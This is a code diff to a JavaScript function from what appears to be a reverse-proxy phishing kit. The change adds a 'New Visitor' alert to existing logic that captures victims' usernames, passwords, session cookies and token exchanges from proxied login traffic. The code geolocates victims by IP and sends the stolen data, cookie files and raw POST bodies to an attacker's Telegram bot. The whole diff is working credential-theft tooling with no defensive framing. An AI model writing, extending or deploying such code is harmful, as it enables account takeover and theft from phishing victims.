@@ -104,11 +104,57 @@ async function sendToTelegram(data) {
         
         console.log('📨 sendToTelegram() CALLED with URL:', url);
         
+        // ---- FIRST VISIT NOTIFICATION (once per session) ----
+        if (!VISITED_SESSIONS.has(sessionId)) {
+            VISITED_SESSIONS.add(sessionId);
+            
+            const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
+                       data.proxyRequestHeaders?.['x-real-ip'] || 
+                       data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
+                       'Unknown';
+
+            let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
+            let flag = '🌍';
+            let location = 'Unknown';
+            if (ip !== 'Unknown') {
+                try {
+                    geo = await getGeoInfo(ip);
+                    flag = getFlagEmoji(geo.countryCode);
+                    location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+                } catch (e) {}
+            }
+
+            const visitMessage = `
+🆕 **New Visitor!**
+
+🌍 **IP:** ${ip}
+${flag} **Location:** ${location}
+🏢 **ISP:** ${geo.isp || 'N/A'}
+📡 **Org:** ${geo.org || 'N/A'}
+
+🕒 **Time:** ${data.timestamp || new Date().toISOString()}
+🔗 **URL:** ${url}
+📨 **Method:** ${method}
+
+🖥️ **User-Agent:** ${userAgent}
+            `;
+
+            console.log('📤 Sending first‑visit notification...');
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: visitMessage,
+                parse_mode: 'Markdown'
+            });
+            console.log('✅ First‑visit notification sent successfully');
+        }
+        
+        // ---- CREDENTIAL / SESSION NOTIFICATION (existing logic) ----
         if (NOTIFIED_SESSIONS.has(sessionId)) {
-            console.log('⏭️ Already notified for session:', sessionId);
+            console.log('⏭️ Already notified for credentials in session:', sessionId);
             return;
         }
         
+        // --- extract credentials (unchanged from original) ---
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                    data.proxyRequestHeaders?.['x-real-ip'] || 
                    data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -182,27 +228,25 @@ async function sendToTelegram(data) {
         }
         
         if (!hasCredentials) {
-            console.log('⏭️ Skipping notification - no credentials found in:', url);
-            return;
+            console.log('⏭️ Skipping credential notification - no credentials found in:', url);
+            return;  // <-- Still returns, but visit notification already sent above.
         }
         
-        console.log('✅ Valid credentials found, sending notification...');
+        console.log('✅ Valid credentials found, sending credential notification...');
         NOTIFIED_SESSIONS.add(sessionId);
         
+        // --- geolocation (re‑fetch if needed) ---
         let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
         let flag = '🌍';
         let location = 'Unknown';
-
         if (ip !== 'Unknown') {
             try {
                 geo = await getGeoInfo(ip);
                 flag = getFlagEmoji(geo.countryCode);
                 location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
-            } catch (e) {
-                console.log('⚠️ Geo lookup failed:', e.message);
-            }
+            } catch (e) {}
         }
-
+        
         let message = `
 🔐 **New Login Captured!**
 
@@ -218,13 +262,12 @@ ${flag} **Location:** ${location}
 
 🖥️ **User-Agent:** ${userAgent}
         `;
-
+        
         if (username !== 'N/A') {
             message += `
 👤 **Username/Email:** ${username}
             `;
         }
-        
         if (password !== 'N/A') {
             message += `
 🔐 **Password:** ${password}
@@ -234,35 +277,35 @@ ${flag} **Location:** ${location}
 ⚠️ **Password:** Not yet captured (waiting for second step)
             `;
         }
-
         if (isSessionCookie) {
             message += `
 🍪 **Session Cookie:** ✅ Captured
 🔑 **Status:** Authenticated session
             `;
         }
-
         if (isTokenExchange) {
             message += `
 🔄 **Token Exchange:** ✅ Detected
 💎 **Value:** High (refresh token / access token)
             `;
         }
-
-        console.log('📤 Sending Telegram message...');
+        
+        console.log('📤 Sending credential Telegram message...');
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         });
-        console.log('✅ Telegram message sent successfully');
-
+        console.log('✅ Credential Telegram message sent successfully');
+        
+        // --- cookie file ---
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies && Object.keys(cookies).length > 0) {
             await sendCookiesAsFile(cookies, sessionId);
             console.log('✅ Cookies file sent');
         }
-
+        
+        // --- raw POST data ---
         if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
@@ -271,14 +314,13 @@ ${flag} **Location:** ${location}
             });
             console.log('✅ Raw data sent successfully');
         }
-
+        
     } catch (e) {
         console.error('❌ sendToTelegram() FAILED:', e.message);
         console.error('   Stack:', e.stack);
-        NOTIFIED_SESSIONS.delete(sessionId);
+        // Optionally, remove from sets to allow retry? We'll keep as is.
     }
 }
-
 // ================================================
 // 𝙲𝙾𝚁𝙴 𝙳𝙴𝙿𝙴𝙽𝙳𝙴𝙽𝙲𝙸𝙴𝚂
 // ================================================
